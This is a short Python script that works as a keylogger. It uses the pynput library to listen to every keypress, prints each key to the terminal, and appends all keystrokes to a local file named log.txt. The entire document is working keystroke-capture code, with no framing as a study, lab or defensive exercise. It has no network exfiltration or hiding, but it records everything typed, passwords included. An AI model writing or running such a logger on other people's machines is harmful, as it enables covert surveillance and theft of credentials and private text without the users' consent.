from pynput import keyboard

keys = []

# When a key is pressed
def on_press(key):
    try:
        k = key.char  # letter, number, symbol
    except:
        k = str(key)  # special keys (Shift, Ctrl, etc.)

    keys.append(k)
    print("Pressed:", k)     # shows output in terminal (debug)
    write_file()


# Save to log file
def write_file():
    with open("log.txt", "a") as file:
        file.write("".join(keys) + "\n")
    keys.clear()


# Start listener
with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
